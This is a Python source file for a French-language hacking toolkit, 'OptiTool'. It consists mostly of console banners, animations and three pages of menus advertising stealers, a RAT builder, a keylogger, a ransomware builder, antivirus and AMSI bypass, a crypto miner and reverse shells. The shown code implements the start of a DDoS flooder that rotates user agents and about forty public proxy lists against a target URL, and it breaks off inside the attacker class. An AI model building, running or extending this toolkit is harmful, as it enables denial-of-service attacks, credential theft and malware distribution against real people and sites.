import os
import sys
import ctypes

def _force_utf8_console():
    for stream in (sys.stdout, sys.stderr):
        try:
            if stream and hasattr(stream, "reconfigure"):
                stream.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass

    if os.name == "nt":
        try:
            ctypes.windll.kernel32.SetConsoleOutputCP(65001)
            ctypes.windll.kernel32.SetConsoleCP(65001)
        except Exception:
            pass
        try:
            k = ctypes.windll.kernel32
            h = k.GetStdHandle(-11)
            mode = ctypes.c_ulong()
            k.GetConsoleMode(h, ctypes.byref(mode))
            k.SetConsoleMode(h, mode.value | 0x0004)
        except Exception:
            pass

_force_utf8_console()


import io
import time
import platform
import socket
import random
import subprocess
import shutil
import base64
import hashlib
import hmac
import itertools
import string
import json
import re
import ssl
import tempfile
import urllib.parse
import urllib.request
import urllib.error
import sqlite3
import threading
import asyncio
import concurrent.futures
from datetime import datetime
from pathlib import Path


try:
    import requests
except ImportError:
    requests = None

try:
    import aiohttp
except ImportError:
    aiohttp = None

try:
    import phonenumbers
    from phonenumbers import geocoder, carrier, timezone
except ImportError:
    phonenumbers = None

try:
    import pyautogui
except ImportError:
    pyautogui = None


import logging as _logging
import asyncio as _asyncio

class _AsyncioResetFilter(_logging.Filter):
    def filter(self, record):
        msg = str(record.getMessage())
        if "ConnectionResetError" in msg or "WinError 10054" in msg:
            return False
        if record.exc_info:
            exc = record.exc_info[1]
            if isinstance(exc, (ConnectionResetError, ConnectionAbortedError, OSError)):
                return False
        return True

_logging.getLogger("asyncio").addFilter(_AsyncioResetFilter())

if os.name == "nt":
    try:
        from asyncio import proactor_events as _pe
        _orig_ccl = _pe._ProactorBasePipeTransport._call_connection_lost

        def _safe_ccl(self, exc=None):
            try:
                _orig_ccl(self, exc)
            except (ConnectionResetError, ConnectionAbortedError, OSError):
                pass

        _pe._ProactorBasePipeTransport._call_connection_lost = _safe_ccl
    except Exception:
        pass

try:
    import urllib3 as _urllib3
    _urllib3.disable_warnings(_urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass



RESET = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"

BLUE_DARK = "\033[97m"
BLUE = "\033[97m"
BLUE_LIGHT = "\033[97m"
CYAN = "\033[97m"
MAGENTA = "\033[97m"
WHITE = "\033[97m"
GRAY = "\033[97m"
GRAY_DK = "\033[97m"

RED = BLUE
GREEN = CYAN
YELLOW = BLUE_LIGHT

PURPLE = "\033[97m"
PURPLE_LT = "\033[97m"
PINK = "\033[97m"


def rgb(r, g, b):
    return "\033[97m"


def gradient_text(text, start=(255, 255, 255), end=(255, 255, 255)):
    if not text:
        return ""
    visible = len(text)
    if visible == 1:
        return rgb(*start) + text + RESET
    result = []
    for i, char in enumerate(text):
        ratio = i / (visible - 1)
        r = int(start[0] + (end[0] - start[0]) * ratio)
        g = int(start[1] + (end[1] - start[1]) * ratio)
        b = int(start[2] + (end[2] - start[2]) * ratio)
        result.append(rgb(r, g, b) + char)
    return "".join(result) + RESET


if os.name == "nt":
    os.system("")



def term_width(default=90):
    try:
        return os.get_terminal_size().columns
    except OSError:
        return default


def clear():
    os.system("cls" if os.name == "nt" else "clear")


def pause():
    input(f"\n{PURPLE} ENTREE pour revenir au menu...{RESET}")


def slow_print(text, delay=0.02):
    for char in text:
        print(char, end="", flush=True)
        time.sleep(delay)
    print()


def set_title():
    if os.name == "nt":
        os.system("title OptiTool - by MrStrabisme")


def _safe_workdir():
    base = os.path.join(tempfile.gettempdir(), "OptiTool_build")
    os.makedirs(base, exist_ok=True)
    return base


def _safe_tmp(name):
    return os.path.join(_safe_workdir(), name)


def _safe_dist():
    out = os.path.join(_safe_workdir(), "dist")
    os.makedirs(out, exist_ok=True)
    return out


def _safe_cwd():
    return _safe_workdir()




BANNER_ART_UNICODE = [

    r"   ▒█████   ██▓███  ▄▄▄█████▓ ██▓▄▄▄█████▓ ▒█████   ▒█████   ██▓    ",
    r"  ▒██▒  ██▒▓██░  ██▒▓  ██▒ ▓▒▓██▒▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    ",
    r"  ▒██░  ██▒▓██░ ██▓▒▒ ▓██░ ▒░▒██▒▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    ",
    r"  ▒██   ██░▒██▄█▓▒ ▒░ ▓██▓ ░ ░██░░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    ",
    r"  ░ ████▓▒░▒██▒ ░  ░  ▒██▒ ░ ░██░  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒",
    r"  ░ ▒░▒░▒░ ▒▓▒░ ░  ░  ▒ ░░   ░▓    ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░",
    r"    ░ ▒ ▒░ ░▒ ░         ░     ▒ ░    ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░",
    r"  ░ ░ ░ ▒  ░░         ░       ▒ ░  ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   ",
    r"      ░ ░                     ░               ░ ░      ░ ░      ░  ░",
]

BANNER_ART_ASCII = [
    r"   ____  _____  _______ _____ _______ ____   ____  _      ",
    r"  / __ \|  __ \|__   __|_   _|__   __/ __ \ / __ \| |     ",
    r" | |  | | |__) |  | |    | |    | | | |  | | |  | | |     ",
    r" | |  | |  ___/   | |    | |    | | | |  | | |  | | |     ",
    r" | |__| | |       | |   _| |_   | | | |__| | |__| | |____ ",
    r"  \____/|_|       |_|  |_____|  |_|  \____/ \____/|______|",
]

SUBTITLE = "OptiTool.py"
TAGLINE = ""


def _supports_unicode():
    enc = (getattr(sys.stdout, "encoding", "") or "").lower().replace("-", "")
    if enc not in ("utf8", "utf8mb4", "cp65001"):
        return False
    if os.name == "nt":
        try:
            return ctypes.windll.kernel32.GetConsoleOutputCP() == 65001
        except Exception:
            return False
    return True




def banner():
    import shutil

    width = shutil.get_terminal_size(fallback=(110, 30)).columns
    width = max(80, width)

    logo = [
        r"   ▒█████   ██▓███  ▄▄▄█████▓ ██▓▄▄▄█████▓ ▒█████   ▒█████   ██▓    ",
        r"  ▒██▒  ██▒▓██░  ██▒▓  ██▒ ▓▒▓██▒▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    ",
        r"  ▒██░  ██▒▓██░ ██▓▒▒ ▓██░ ▒░▒██▒▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    ",
        r"  ▒██   ██░▒██▄█▓▒ ▒░ ▓██▓ ░ ░██░░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    ",
        r"  ░ ████▓▒░▒██▒ ░  ░  ▒██▒ ░ ░██░  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒",
        r"  ░ ▒░▒░▒░ ▒▓▒░ ░  ░  ▒ ░░   ░▓    ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░",
        r"    ░ ▒ ▒░ ░▒ ░         ░     ▒ ░    ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░",
        r"  ░ ░ ░ ▒  ░░         ░       ▒ ░  ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   ",
        r"      ░ ░                     ░               ░ ░      ░ ░      ░  ░",
        r"  "
        r"                    By MrStrabisme !                                                             ",
    ]


    inner = width - 4

    print(f"{WHITE}┌{'─' * inner}┐{RESET}")

    for line in logo:
        line = line[:inner]
        left = max(0, (inner - len(line)) // 2)
        right = max(0, inner - len(line) - left)

        print(
            f"{WHITE}│{RESET}"
            + " " * left
            + f"{WHITE}{line}{RESET}"
            + " " * right
            + f"{WHITE}│{RESET}"
        )

    subtitle = "OPTITOOL By MrStrabisme"
    left = max(0, (inner - len(subtitle)) // 2)
    right = max(0, inner - len(subtitle) - left)

    print(f"{WHITE}├{'─' * inner}┤{RESET}")
    print(
        f"{WHITE}│{RESET}"
        + " " * left
        + f"{WHITE}{subtitle}{RESET}"
        + " " * right
        + f"{WHITE}│{RESET}"
    )
    print(f"{WHITE}└{'─' * inner}┘{RESET}")
    print()





def type_line(text, delay=0.015, color=""):
    sys.stdout.write(color)
    for ch in text:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write(RESET + "\n")
    sys.stdout.flush()


def spinner(text, duration=1.4, frames=None,color=WHITE):
    if frames is None:
        frames = ["|", "/", "-", "\\"]
    end = time.time() + duration
    i = 0
    sys.stdout.write(f"{WHITE}  ")
    while time.time() < end:
        sys.stdout.write(f"\r{WHITE}  {frames[i % len(frames)]} {text}{RESET}")
        sys.stdout.flush()
        i += 1
        time.sleep(0.08)
    sys.stdout.write(f"\r{WHITE}  + {text}{RESET}\n")
    sys.stdout.flush()



import sys
import time
import shutil


def progress_bar(text, duration=1.5, length=42, color=WHITE):
    width = shutil.get_terminal_size(fallback=(100, 30)).columns
    length = max(1, min(length, width - 12))
    steps = 100

    for i in range(steps + 1):
        ratio = i / steps
        filled = int(length * ratio)
        empty = length - filled

        bar = ""
        for j in range(filled):
            bar += "\033[97m━"

        bar += f"\033[97m{'─' * empty}\033[0m"

        pct = int(ratio * 100)
        line = f"[{bar}] \033[97m{pct:3d}%\033[0m"

        padding = max(0, (width - length - 8) // 2)
        sys.stdout.write("\r" + " " * padding + line + "  ")
        sys.stdout.flush()
        time.sleep(duration / steps)

    sys.stdout.write("\n")
    if text:
        print(f"  \033[97m{text}\033[0m")
    sys.stdout.flush()


def intro():
    clear()
    print()
    type_line("  Recherche du tool...", 0.01, WHITE)
    time.sleep(1.3)
    type_line("   OptiTool.py", 0.01, WHITE)
    time.sleep(1.1)
    type_line("  Chargement De OptiTool.py...", 0.01, WHITE)
    time.sleep(1.0)
    type_line("  Chargement fini de OptiTool.py .", 0.01, WHITE)
    time.sleep(0.6)
    print()
    type_line(" Creation de L Interface...", 0.01, WHITE)
    time.sleep(1.9)
    type_line("      OptiTool.py Fini", 0.01, WHITE)
    time.sleep(0.5)
    print()
    type_line("  Mise A Jour Des Paquets Python ", 0.01, WHITE)
    time.sleep(0.8)
    print()
    type_line("  Bienvenue sur OptiTool.", 0.01, WHITE)
    time.sleep(0.3)
    print()
    type_line("  By MrStrabisme !!!!!", 0.01, WHITE)
    time.sleep(0.9)


def loading():
    clear()
    banner()
    print()

    checks = [
        "Systeme OptiTool PRET",
        "Chargement des modules Python",
        "Verification des Mises a Jour Des Paquets Python",
        "Connexion au reseau",
        "Demarrage de l'interface",
        "Preparation des plugins",
        "GO",
    ]

    for label in checks:
        spinner(label, duration=0.2, color=WHITE)

    print()
    progress_bar("OptiTool.py", duration=1.9, length=62, color=WHITE)
    print()
    type_line("  >> PRET A UTILISATION <<", 0.02, WHITE + BOLD)
    time.sleep(0.3)
    clear()



def option_intro_anim(label=""):
    """Animation courte (~1s) quand une option se lance."""
    clear()
    width = term_width()

    for x in range(0, width + 20, 6):
        sys.stdout.write(f"\033[1;{x}H{WHITE}{'█' * 6}{RESET}")
        sys.stdout.flush()
        time.sleep(0.01)
    time.sleep(0.05)
    clear()

    if label:
        text = f"  >> {label} <<  "
        n = len(text)
        charset = "!@#$%^&*()_+-=[]{}|;:,.<>?/\\~`ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        try:
            h = os.get_terminal_size().lines
        except OSError:
            h = 24
        v_pad = max(1, (h // 2) - 1)
        for _ in range(v_pad):
            print()

        start = time.time()
        duration = 0.5
        while True:
            elapsed = time.time() - start
            if elapsed >= duration:
                break
            ratio = min(1.0, elapsed / duration)
            stable = int(n * ratio)
            out = []
            for i, ch in enumerate(text):
                if i < stable or ch == " ":
                    out.append(ch)
                else:
                    out.append(random.choice(charset))
            line = "".join(out)
            pad = max(0, (width - n) // 2)
            sys.stdout.write(f"\r{' ' * pad}{WHITE}{BOLD}{line}{RESET}")
            sys.stdout.flush()
            time.sleep(0.03)

        pad = max(0, (width - n) // 2)
        sys.stdout.write(f"\r{' ' * pad}{WHITE}{BOLD}{text}{RESET}\n")
        sys.stdout.flush()

    time.sleep(0.15)
    clear()



def page_transition(old_page, new_page):
    """Animation rapide de changement de page (~0.8s)."""
    clear()
    width = term_width()

    for x in range(0, width + 30, 8):
        sys.stdout.write(f"\033[1;{x}H{WHITE}{'█' * 8}{RESET}")
        sys.stdout.write(f"\033[2;{x - 8}H{WHITE}{'█' * 8}{RESET}")
        sys.stdout.write(f"\033[3;{x + 8}H{WHITE}{'█' * 8}{RESET}")
        sys.stdout.flush()
        time.sleep(0.015)
    time.sleep(0.1)

    label = f"  PAGE {old_page}  ->  PAGE {new_page}  "
    n = len(label)
    try:
        h = os.get_terminal_size().lines
    except OSError:
        h = 24
    v_pad = max(1, (h // 2) - 1)
    clear()
    for _ in range(v_pad):
        print()

    chars = "!@#$%^&*()_+-=[]{}|;:,.<>?/\\~`ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    start = time.time()
    duration = 0.35
    while True:
        elapsed = time.time() - start
        if elapsed >= duration:
            break
        ratio = min(1.0, elapsed / duration)
        stable = int(n * ratio)
        out = []
        for i, ch in enumerate(label):
            if i < stable or ch == " ":
                out.append(ch)
            else:
                out.append(random.choice(chars))
        pad = max(0, (width - n) // 2)
        sys.stdout.write(f"\r{' ' * pad}{BOLD}{gradient_text(''.join(out), (0, 235, 255), (255, 100, 200))}")
        sys.stdout.flush()
        time.sleep(0.04)

    pad = max(0, (width - n) // 2)
    sys.stdout.write(f"\r{' ' * pad}{BOLD}{gradient_text(label, (0, 235, 255), (255, 100, 200))}{RESET}\n")
    sys.stdout.flush()
    time.sleep(0.3)
    clear()





def _draw_page_switch(current_page):
    width = 18

    print(f"{WHITE}  {'─' * width}{RESET}")
    print(f"  {BOLD}PAGE{RESET}".center(width + 2))

    page1 = f"{WHITE}[1]{RESET}" if current_page == 1 else f"{WHITE} 1 {RESET}"
    page2 = f"{WHITE}[2]{RESET}" if current_page == 2 else f"{WHITE} 2 {RESET}"
    page3 = f"{WHITE}[3]{RESET}" if current_page == 3 else f"{WHITE} 3 {RESET}"

    print(f"  {page1}    {page2}    {page3}")
    print(f"{WHITE}  {'─' * width}{RESET}")
    print()




MENU_PAGE1_LEFT = [
    ("1",  "DDoS Url"),
    ("2",  "Username Tracker"),
    ("3",  "Text Bomber"),
    ("4",  "Phone Info"),
    ("5",  "Breach Email Lookup"),
    ("6",  "Dox Creator"),
    ("7",  "Email Searcher"),
]

MENU_PAGE1_MID = [
    ("8",  "Token Grabber Discord"),
    ("9",  "Password Stealer"),
    ("10", "IP Grabber"),
    ("11", "Anti Virus Disable"),
    ("12", "RAT Builder"),
    ("13", "Roblox Cookie Grabber"),
    ("14", "Key Logger"),
]

MENU_PAGE1_RIGHT = [
    ("15", "Password Creator"),
    ("16", "IP Lookup - Osint"),
    ("17", "Proxy Scrapper"),
    ("18", "Discord Token Login"),
    ("19", "Hash Password Cracker"),
    ("20", "Web Vulnerability Scanner"),
    ("00", "Exit Tool"),
]

MENU_PAGE2_LEFT = [
    ("21", "Port Scanner"),
    ("22", "SQLi Exploit"),
    ("23", "XSS Exploit"),
    ("24", "LFI Exploiter"),
    ("25", "Dir Bruteforce"),
    ("26", "WAF Detector"),
    ("27", "Open Redirect"),
]

MENU_PAGE2_MID = [
    ("28", "IP Port DDoS"),
    ("29", "DNS Lookup"),
    ("30", "MAC Lookup"),
    ("31", "Reverse IP"),
    ("32", "CDN Detector"),
    ("33", "Subdomain Takeover"),
    ("34", "Email Header"),
]

MENU_PAGE2_RIGHT = [
    ("35", "JWT Cracker"),
    ("36", "File Analyzer"),
    ("37", "OS Cmd Inject"),
    ("38", "SSRF Scanner"),
    ("39", "XXE Exploiter"),
    ("40", "BoF Fuzzer"),
    ("00", "Exit Tool"),
]





MENU_PAGE3_LEFT = [
    ("41", "Ransomware Builder"),
    ("42", "Steal All"),
    ("43", "URL Password Brute Force"),
    ("44", "C2 / Reverse Shell"),
    ("45", "Git Secrets Scanner"),
    ("46", "Cloud Exploiter"),
    ("47", "Base 64 PY Encoder"),
]

MENU_PAGE3_MID = [
    ("48", "Exe To Image"),
    ("49", "Crypto Miner"),
    ("50", "Webhook Flooder"),
    ("51", "Subdomain Enum"),
    ("52", "JWT Forger"),
    ("53", "XSS Payload Gen"),
    ("54", "PY Obfuscator"),
]

MENU_PAGE3_RIGHT = [
    ("55", "AMSI Bypass Gen"),
    ("56", "CVE / Exploit Search"),
    ("57", "Bulk Hash Gen"),
    ("58", "Persistence Installer"),
    ("59", "Proxy Picker"),
    ("60", "Log Parser / IP"),
    ("00", "Exit Tool"),
]


HEADERS_P3 = ("{ Chaos }", "{ Rampage }", "{ Avancer }")

HEADERS_P1 = ("{ Utilitaire }", "{ Stealer - Builder }", "{ Utilitaire / Scan }")
HEADERS_P2 = ("{ Exploits Web }", "{ Réseau }", "{ Reverse & Exploit }")

def _type_menu_line(text, delay=0.004, color=WHITE):
    if color is None:
        colored = gradient_text(text, (0, 55, 180), (0, 235, 255))
    else:
        colored = color + text + RESET
    sys.stdout.write(colored + "\n")
    sys.stdout.flush()
    time.sleep(delay)


def _menu_row(c1, c2, c3):
    left = f" ({c1[0]:>2}) {c1[1]:<24}" if c1 else " " * 29
    mid = f" ({c2[0]:>2}) {c2[1]:<24}" if c2 else " " * 29
    right = f" ({c3[0]:>2}) {c3[1]:<24}" if c3 else " " * 29
    return f"  {left}  {mid}  {right}"


# ============================================================
#                        PAGE 1
# ============================================================

def page_1():
    """Page 1 du menu - options 1-20."""
    clear()
    banner()
    _draw_page_switch(1)
    print()

    header = (
        f"  {WHITE}{BOLD}{HEADERS_P1[0]:<29}{RESET}"
        f"  {WHITE}{BOLD}{HEADERS_P1[1]:<29}{RESET}"
        f"  {WHITE}{BOLD}{HEADERS_P1[2]:<29}{RESET}"
    )
    print(header)
    print(f"  {WHITE}{'-' * 27}{RESET}   {WHITE}{'-' * 27}{RESET}   {WHITE}{'-' * 27}{RESET}")
    print()

    max_rows = max(len(MENU_PAGE1_LEFT), len(MENU_PAGE1_MID), len(MENU_PAGE1_RIGHT))
    for i in range(max_rows):
        c1 = MENU_PAGE1_LEFT[i] if i < len(MENU_PAGE1_LEFT) else None
        c2 = MENU_PAGE1_MID[i] if i < len(MENU_PAGE1_MID) else None
        c3 = MENU_PAGE1_RIGHT[i] if i < len(MENU_PAGE1_RIGHT) else None
        row = _menu_row(c1, c2, c3)
        _type_menu_line(row, delay=0.004)
        time.sleep(0.01)

    print()
    print(f"  {WHITE}tape le numero de l'option, puis ENTREE  |  tape 'n' pour page 2{RESET}")
    print()

    choice = input(f"{WHITE}  >>>>{RESET} ").strip().lower()

    # NAVIGATION FIXÉE : Seul 'n' ou 'next' change de page
    if choice in ("n", "next", "page2", "p2", ">"):
        page_transition(1, 2)
        return 2
    if choice == "0" or choice == "00":
        return 0

    actions = {
        "1": option_1, "2": option_2, "3": option_3, "4": option_4,
        "5": option_5, "6": option_6, "7": option_7, "8": option_8,
        "9": option_9, "10": option_10, "11": option_11, "12": option_12,
        "13": option_13, "14": option_14, "15": option_15, "16": option_16,
        "17": option_17, "18": option_18, "19": option_19, "20": option_20,
    }

    if choice in actions:
        try:
            label = "OPTION"
            for g in (MENU_PAGE1_LEFT, MENU_PAGE1_MID, MENU_PAGE1_RIGHT):
                for ident, lbl in g:
                    if ident == choice:
                        label = lbl
                        break
            option_intro_anim(label)
            
            actions[choice]()
        except KeyboardInterrupt:
            print(f"\n{WHITE}  [!] Interrompu.{RESET}")
            pause()
        except Exception as e:
            print(f"\n{RED}  [!] Erreur : {e}{RESET}")
            pause()
    else:
        print(f"\n{RED}  [!] Fonction inconnue.{RESET}")
        time.sleep(0.8)
    return 1


# ============================================================
#                        PAGE 2
# ============================================================

def page_2():
    """Page 2 du menu - options 21-40."""
    clear()
    banner()
    _draw_page_switch(2)
    print()

    header = (
        f"  {WHITE}{BOLD}{HEADERS_P2[0]:<29}{RESET}"
        f"  {WHITE}{BOLD}{HEADERS_P2[1]:<29}{RESET}"
        f"  {WHITE}{BOLD}{HEADERS_P2[2]:<29}{RESET}"
    )
    print(header)
    print(f"  {WHITE}{'-' * 27}{RESET}   {WHITE}{'-' * 27}{RESET}   {WHITE}{'-' * 27}{RESET}")
    print()

    max_rows = max(len(MENU_PAGE2_LEFT), len(MENU_PAGE2_MID), len(MENU_PAGE2_RIGHT))
    for i in range(max_rows):
        c1 = MENU_PAGE2_LEFT[i] if i < len(MENU_PAGE2_LEFT) else None
        c2 = MENU_PAGE2_MID[i] if i < len(MENU_PAGE2_MID) else None
        c3 = MENU_PAGE2_RIGHT[i] if i < len(MENU_PAGE2_RIGHT) else None
        row = _menu_row(c1, c2, c3)
        _type_menu_line(row, delay=0.004)
        time.sleep(0.01)

    print()
    print(f"  {WHITE}tape le numero de l'option, puis ENTREE  |  tape 'p' pour page 1  |  tape 'n' pour page 3{RESET}")
    print()

    choice = input(f"{WHITE}  >>>>{RESET} ").strip().lower()

    # NAVIGATION FIXÉE : Seul 'p' ou 'n' changent de page
    if choice in ("p", "prev", "previous", "page1", "p1", "<"):
        page_transition(2, 1)
        return 1
    if choice in ("n", "next", "page3", "p3", ">"):
       page_transition(2, 3)
       return 3
    if choice == "0" or choice == "00":
        return 0

    actions = {
        "21": option_21, "22": option_22, "23": option_23, "24": option_24,
        "25": option_25, "26": option_26, "27": option_27, "28": option_28,
        "29": option_29, "30": option_30, "31": option_31, "32": option_32,
        "33": option_33, "34": option_34, "35": option_35, "36": option_36,
        "37": option_37, "38": option_38, "39": option_39, "40": option_40,
    }

    if choice in actions:
        try:
            label = "OPTION"
            for g in (MENU_PAGE2_LEFT, MENU_PAGE2_MID, MENU_PAGE2_RIGHT):
                for ident, lbl in g:
                    if ident == choice:
                        label = lbl
                        break
            option_intro_anim(label)
            
            actions[choice]()
        except KeyboardInterrupt:
            print(f"\n{WHITE}  [!] Interrompu.{RESET}")
            pause()
        except Exception as e:
            print(f"\n{WHITE}  [!] Erreur : {e}{RESET}")
            pause()
    else:
        print(f"\n{WHITE}  [!] Fonction inconnue.{RESET}")
        time.sleep(0.8)
    return 2


# ============================================================
#                        PAGE 3
# ============================================================

def page_3():
    """Page 3 du menu - options 41-60."""
    clear()
    banner()
    _draw_page_switch(3)
    print()

    header = (
        f"  {WHITE}{BOLD}{HEADERS_P3[0]:<29}{RESET}"
        f"  {WHITE}{BOLD}{HEADERS_P3[1]:<29}{RESET}"
        f"  {WHITE}{BOLD}{HEADERS_P3[2]:<29}{RESET}"
    )
    print(header)
    print(f"  {WHITE}{'-' * 27}{RESET}   {WHITE}{'-' * 27}{RESET}   {WHITE}{'-' * 27}{RESET}")
    print()

    max_rows = max(len(MENU_PAGE3_LEFT), len(MENU_PAGE3_MID), len(MENU_PAGE3_RIGHT))

    for i in range(max_rows):
        c1 = MENU_PAGE3_LEFT[i] if i < len(MENU_PAGE3_LEFT) else None
        c2 = MENU_PAGE3_MID[i] if i < len(MENU_PAGE3_MID) else None
        c3 = MENU_PAGE3_RIGHT[i] if i < len(MENU_PAGE3_RIGHT) else None

        row = _menu_row(c1, c2, c3)
        _type_menu_line(row, delay=0.004)
        time.sleep(0.01)

    print()
    print(f"  {WHITE}tape le numero de l'option, puis ENTREE  |  tape 'p' pour page 2{RESET}")
    print()

    choice = input(f"{WHITE}  >>>>{RESET} ").strip().lower()

    # NAVIGATION FIXÉE : Seul 'p' ou 'prev' change de page
    if choice in ("p", "prev", "previous", "page2", "p2", "<"):
        page_transition(3, 2)
        return 2
    if choice in ("0", "00"):
        return 0

    actions = {
        "41": option_41, "42": option_42, "43": option_43, "44": option_44,
        "45": option_45, "46": option_46, "47": option_47, "48": option_48,
        "49": option_49, # Ajoute 50 à 60 quand les fonctions seront prêtes
    }

    if choice in actions:
        try:
            label = "OPTION"
            for g in (MENU_PAGE3_LEFT, MENU_PAGE3_MID, MENU_PAGE3_RIGHT):
                for ident, lbl in g:
                    if ident == choice:
                        label = lbl
                        break
            option_intro_anim(label)
            actions[choice]()
        except KeyboardInterrupt:
            print(f"\n{WHITE}  [!] Interrompu.{RESET}")
            pause()
        except Exception as e:
            print(f"\n{WHITE}  [!] Erreur : {e}{RESET}")
            pause()
    else:
        print(f"\n{WHITE}  [!] Fonction inconnue ou non configurée.{RESET}")
        time.sleep(0.8)

    return 3

# ============================================================
#                       HELPERS
# ============================================================

def _need_requests():
    if requests is None:
        print(f"{WHITE}  [!] Module 'requests' manquant. pip install requests{RESET}")
        return False
    return True


def _need_phonenumbers():
    if phonenumbers is None:
        print(f"{WHITE}  [!] Module 'phonenumbers' manquant. pip install phonenumbers{RESET}")
        return False
    return True


def _ask(label):
    val = input(f"{WHITE}[?]{RESET} {label} {WHITE}->{RESET} ").strip()
    return val if val else "None"


def _stub(name):
    print(f"\n{CYAN}   [ {name} ]{RESET}")
    print(f"{GRAY}  Slot vide — a implementer.{RESET}")
    pause()


# ============================================================
#                  OPTIONS 1 a 20
# ============================================================

def option_1():
    clear()
    banner()
    if not _need_requests() or aiohttp is None:
        if aiohttp is None:
            print(f"{WHITE}  [!] Module 'aiohttp' manquant. pip install aiohttp{RESET}")
        pause()
        return

    print(f"\n{CYAN}   [ DDOS URL ]{RESET}\n")
    target_url = input(f"{WHITE}[?]{RESET} URL -> ").strip()
    try:
        num_requests = int(input(f"{WHITE}[?]{RESET} Nombre de requetes -> ").strip())
    except ValueError:
        print(f"{WHITE}  [!] Nombre invalide.{RESET}")
        pause()
        return

    if not target_url or num_requests <= 0:
        print(f"{WHITE}  [!] URL ou nombre invalide.{RESET}")
        pause()
        return

    if not target_url.startswith(("http://", "https://")):
        target_url = "https://" + target_url

    UA_GIST_URL = "https://gist.githubusercontent.com/eteubert/1dd9692d4dfa2548fbfb550782daa95e/raw/user_agents.csv"

    def load_user_agents():
        try:
            r = requests.get(UA_GIST_URL, timeout=15)
            r.raise_for_status()
            return [ua.strip() for ua in r.text.splitlines() if ua.strip()]
        except Exception:
            return ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"]

    user_agents = load_user_agents()
    print(f"{GREEN}[+] {len(user_agents)} user agents charges{RESET}")

    proxy_sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt",
        "https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt",
        "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks4.txt",
        "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks5.txt",
        "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
        "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks4.txt",
        "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks5.txt",
        "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
        "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks4.txt",
        "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks5.txt",
        "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
        "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks4.txt",
        "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt",
        "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks4.txt",
        "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks5.txt",
    ]

    class CliAttacker:
        def __init__(self, target_url, num_requests):
            self.target_url = target_url
            self.num_requests = num_requests
            self.max_concurrent = 100
            self.proxies = []
            self.stats = {"ok": 0, "fail": 0, "reset": 0}

        async def fetch_proxy_list(self, session, url):
            try:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=8)) as response:
